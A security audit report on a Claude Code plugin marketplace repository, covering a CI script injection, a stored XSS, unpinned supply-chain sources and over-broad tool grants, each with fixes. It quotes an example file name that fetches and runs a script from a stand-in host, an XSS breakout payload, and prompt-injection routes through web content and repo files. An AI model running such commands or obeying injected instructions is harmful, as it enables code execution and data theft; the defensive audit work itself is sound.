# Security Scan Report

**Repository:** `claude-plugins-official` (Claude Code plugin marketplace)
**Date:** 2026-08-24
**Scope:** Full repository — internal plugins (`/plugins`), external plugins (`/external_plugins`), the marketplace manifest, CI workflows, and all bundled scripts and prompt content.
**Method:** Nine parallel surface scanners followed by adversarial verification of every medium-or-higher candidate (each finding was independently re-checked by a reviewer instructed to refute it). Two candidates were refuted and downgraded to hardening notes; the rest are reported below with their verified severity.

## Threat model

The marketplace distributes code that runs on the machines of everyone who installs a plugin. Four trust boundaries matter:

- **Hooks** run automatically, with the user's privileges, whenever a matching event fires.
- **Skills / commands / agents** are prompts injected into users' Claude sessions; a malicious one is a prompt-injection payload, and a permissive `allowed-tools` grant widens what an injection can do.
- **`.mcp.json` configs** make users' clients launch and connect to the listed servers at session start.
- **`marketplace.json`** controls what code is fetched onto users' machines at install/update time.

## Summary

No malware, backdoors, hardcoded secrets, or typosquatted sources were found. The four bundled TypeScript MCP servers (discord, fakechat, imessage, telegram) are notably well hardened — iMessage uses a static AppleScript template with argv passthrough (no `osascript` injection), all SQLite access is parameterized, and tokens load from `chmod 600` `.env` files. The `close-external-prs.yml` `pull_request_target` workflow is safe (API-only, no checkout of PR code). The session-report HTML path escapes all transcript-derived content.

The real findings cluster into three themes: **(1)** a CI script-injection and a stored-XSS in bundled tooling; **(2)** a systemic supply-chain pinning gap across the marketplace and several MCP configs; and **(3)** several over-broad `allowed-tools` / prompt-injection surfaces and local-file hardening gaps.

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High     | 0 |
| Medium   | 5 |
| Low      | ~20 |
| Info     | 4 |

No critical or high-severity issues survived verification; two candidates initially rated high (the CI injection and the XSS) were confirmed real but capped at medium by their execution context.

---

## Medium findings

### M1 — GitHub Actions script injection via attacker-controlled PR file names
**File:** `.github/workflows/validate-frontmatter.yml:35`

The `Validate frontmatter` step interpolates a step output derived from PR file names straight into a `run:` block:

```yaml
run: |
  echo "${{ steps.changed.outputs.files }}" | xargs bun .github/scripts/validate-frontmatter.ts
```

`${{ }}` is substituted as raw text *before* the shell parses the line. Git allows almost any byte in a path (backticks, `$( )`, `"`, `;`, newlines), and the collecting `grep` uses `.*`, so a fork PR that adds a file named e.g. `plugins/x/agents/$(curl -s https://evil.example/x.sh|bash).md` executes arbitrary code on the runner. The earlier step handles the list safely via a shell variable and `$GITHUB_OUTPUT`; the flaw is re-introduced solely by reading it back through `${{ }}`.

**Blast radius:** the trigger is `pull_request` (not `pull_request_target`), so fork PRs get a read-only `GITHUB_TOKEN` and no secrets. Impact is runner RCE, read-only-token abuse, CI recon, and possible cache poisoning — not repo takeover. GitHub's first-time-contributor approval gate narrows but does not remove exposure (approved/returning contributors run automatically).

**Fix:** pass the value through the environment and let the shell read it as data:
```yaml
- name: Validate frontmatter
  if: steps.changed.outputs.files != ''
  env:
    FILES: ${{ steps.changed.outputs.files }}
  run: printf '%s\n' "$FILES" | xargs -d '\n' bun .github/scripts/validate-frontmatter.ts
```

### M2 — Stored XSS via `</script>` breakout in the eval-viewer
**File:** `plugins/skill-creator/skills/skill-creator/eval-viewer/generate_review.py:281`

The eval-review page is built by splicing JSON-serialized eval data into a live `<script>` block:

```python
data_json = json.dumps(embedded)
return template.replace("/*__EMBEDDED_DATA__*/", f"const EMBEDDED_DATA = {data_json};")
```

The placeholder sits inside `<script>` (`viewer.html:647-649`). `json.dumps` does not escape `<`, `>`, or `/`, so any embedded string containing the literal `</script>` closes the element early and the following bytes parse as HTML. The embedded data includes each eval output file's raw text (`embed_file()` → `path.read_text()`) and grader-quoted evidence. A skill under test that processes an attacker-influenced document, web page, or tool output can emit `</script><img src=x onerror=...>` into an `outputs/` file. When the reviewer opens the auto-launched viewer at `http://localhost:3117`, the injected script runs in that origin — it can exfiltrate the whole embedded dataset, POST to the `/api/feedback` endpoint (writing `feedback.json` to disk), and probe other localhost services.

**Fix:** escape HTML-significant characters before injection —
`data_json = json.dumps(embedded).replace('<','\\u003c').replace('>','\\u003e').replace('&','\\u0026')` — or emit the data into a `<script type="application/json">` element read via `JSON.parse(el.textContent)`.

### M3 — Marketplace: 36 of 91 externally-hosted plugins are unpinned
**File:** `.claude-plugin/marketplace.json`

25 `url` sources lack a `sha`, 10 `git-subdir` sources lack a `sha` (9 track `ref: main`; `semgrep` has neither `ref` nor `sha`), and the 1 `github` shorthand source (`stagehand` → `browserbase/agent-browse`) is inherently unpinnable. Every one of these resolves to the upstream repo's current HEAD at install/update time, so anyone with push access to an upstream repo — the vendor, a compromised maintainer, or a hijacked org — silently ships code that installers immediately execute. Because plugins can carry `hooks.json` hooks that run shell scripts automatically, this is a direct RCE supply-chain gap. The repo's own convention (CLAUDE.md, and 55 correctly-pinned entries) shows `sha` pinning is the intended norm.

Worst examples: `superpowers` (personal account `obra/superpowers.git`, no review gate), `semgrep` (no `ref` and no `sha`), `stagehand` (un-pinnable `github` shorthand). The rest span vendor orgs (atlassian, figma, vercel, sentry, notion, slack, shopify, posthog, stripe, the four `awslabs` subdir entries, etc.).

**Fix:** add a reviewed `sha` to every `url` and `git-subdir` entry, an explicit `ref` to `semgrep`, convert `stagehand` to a sha-pinned `url` source, and add a CI check in `validate-marketplace.ts` that rejects external sources without a 40-char `sha`.

### M4 — MCP config runs the unpinned git HEAD of a third-party repo (serena)
**File:** `external_plugins/serena/.mcp.json:4`

```json
"args": ["--from", "git+https://github.com/oraios/serena", "serena", "start-mcp-server"]
```

`uvx` builds and runs the tip of the community `oraios/serena` repo with no ref, tag, or commit pin. The server auto-starts when a session begins with the plugin enabled, so anyone who can push to that repo's default branch gets arbitrary Python execution on every installed user's machine — with no registry publish, review, or integrity hash in between. This is the weakest pin among the MCP configs (unlike the npm cases below there is not even a registry audit trail or 2FA-gated publish).

The same class, lower impact (npm has a publish/2FA audit trail and forbids republish of a fixed version), applies to `context7` (`npx -y @upstash/context7-mcp`, implicit latest), `firebase` (`firebase-tools@latest`), and `playwright` (`@playwright/mcp@latest`). `terraform` correctly pins a Docker image tag (though a tag is still mutable vs. a digest).

**Fix:** pin serena to `git+https://github.com/oraios/serena@<commit>`; pin the npx servers to exact versions; update via reviewed PRs.

### M5 — super-app skills pre-approve unscoped Bash while ingesting live web content
**File:** `plugins/super-app/skills/market-brief/SKILL.md:5` (also `fact-check`, `research-report`, and the two agents)

```yaml
allowed-tools: [Read, Glob, Grep, Bash, Agent]
```

These user-invoked skills feed untrusted real-time web content (Perplexity Sonar responses summarizing arbitrary pages, or a user-supplied article URL) back into the session, and grant blanket `Bash` (plus `Agent`). A page crafted to be retrieved during a brief can carry prompt-injection directives, and the unscoped Bash pre-approval lets injected instructions run shell commands with no permission prompt. The same skills wire up Gmail/Notion/Calendar MCP delivery, giving an injection both an execution channel and a data-egress channel. The skills only need to run the bundled `sonar_search.py`.

**Fix:** scope Bash to the bundled script (e.g. `Bash(python*sonar_search.py*)`, `Bash(python3*sonar_search.py*)`), drop `Agent` where unused, and instruct that web-derived content must never change user-chosen delivery destinations.

*Related (Low):* `plugins/pr-review-toolkit/commands/review-pr.md:5` pre-approves unscoped Bash while processing attacker-controlled PR content — same injection-plus-execution shape, verified as low because PR review is an explicit, user-initiated action on code the user is already inspecting.

---

## Low findings

**Prompt-injection / over-broad tool grants**
- `plugins/ralph-loop/hooks/stop-hook.sh:185` — Stop hook auto-consumes a repo-checked-in `.claude/ralph-loop.local.md` and feeds its body back to the model as instructions; a legacy no-session-id path lets a malicious repo drive persistent repo-controlled prompt injection.
- `plugins/hookify/core/config_loader.py:210` — project-local rule files are loaded and their bodies injected as `systemMessage` (content/prompt injection from a cloned repo).
- `plugins/hookify/core/rule_engine.py:15` — unbounded regex from project rule files applied to the full transcript (ReDoS).
- `plugins/plugin-dev/skills/command-development/references/marketplace-considerations.md:18` — official authoring docs demonstrate `allowed-tools: Bash(*)` as the pattern for distributed commands.

**Supply-chain hygiene**
- `external_plugins/context7/.mcp.json:4`, `firebase/.mcp.json:4` — `npx -y` with floating / `@latest` versions (see M4).
- `external_plugins/playwright/.mcp.json:4` — `@playwright/mcp@latest` (hardening note; verifier judged marginal exposure negligible given Microsoft-scope trust).
- `external_plugins/terraform/.mcp.json:9` — Docker image pinned by mutable tag, not digest.
- `external_plugins/imessage/package.json:8` (and the other bun servers) — `bun install` runs from the network on every launch (mitigated by committed integrity-pinned lockfiles).
- `.claude-plugin/marketplace.json` — `atomic-agents` uses an unsupported `path` field on a `url` source and is unpinned; several vendor-branded plugins are sourced from personal GitHub accounts.
- `.github/workflows/validate-frontmatter.yml:16` — third-party `oven-sh/setup-bun@v2` pinned to a mutable tag, not a commit SHA.
- `.github/workflows/validate-frontmatter.yml:10` — no top-level `permissions:` block (broad default `GITHUB_TOKEN`); add least-privilege `permissions: { contents: read }`.

**Local-file / client-side hardening**
- `plugins/skill-creator/.../eval-viewer/viewer.html:1133` and `:849` — benchmark metadata and file-derived spreadsheet content rendered via `innerHTML` (secondary XSS sinks to M2).
- `plugins/skill-creator/.../scripts/package_skill.py:93` — packaging follows symlinks, pulling files from outside the skill folder.
- `external_plugins/fakechat/server.ts:278` — DOM XSS in the reply-preview via `innerHTML` of prior message text (test harness).
- `external_plugins/fakechat/server.ts:150` — loopback server accepts unauthenticated input and file writes from any local process.
- `external_plugins/imessage/server.ts:804` — under the non-default `IMESSAGE_ALLOW_SMS` opt-in, a spoofed SMS from the owner's own number reaches the self-chat trust path.
- `plugins/security-guidance/hooks/security_reminder_hook.py:14` — insecure predictable `/tmp` debug-log path (symlink / world-writable temp).
- `plugins/session-report/skills/session-report/SKILL.md:14` — writes user prompt content to a fixed world-readable `/tmp` path.

## Info

- `.claude-plugin/marketplace.json:1496` — several fork-added plugins (super-app, productivity-tracking, example-plugin) are attributed to Anthropic and four homepages point at a personal fork while the manifest presents itself as the official Anthropic marketplace. Attribution/provenance concern rather than a code vulnerability.
- `.claude-plugin/marketplace.json:434` — the same upstream repo is registered under multiple names with divergent pinned commits.
- `plugins/security-guidance/hooks/security_reminder_hook.py:131` — `session_id` from hook input flows unsanitized into a filesystem path (constrained by the harness-generated value; no demonstrated traversal).
- `plugins/skill-creator/.../eval-viewer/viewer.html:10` — the eval viewer loads a third-party CDN script and Google Fonts on open; the only remote-code load in the repo, and it is SRI-pinned (SheetJS `sha384-...`), so integrity is enforced.

## Recommended priority

1. **M1** — fix the CI injection (small, self-contained, prevents runner RCE from any fork PR).
2. **M2** — escape the eval-viewer data injection (prevents XSS from processed eval content).
3. **M3 / M4** — add `sha` pins across `marketplace.json` and the serena/npx MCP configs, and enforce pinning in CI. This is the highest-leverage systemic fix: it closes the marketplace's largest RCE supply-chain surface.
4. **M5** and the related Low prompt-injection items — scope `allowed-tools` down to what each skill actually needs.
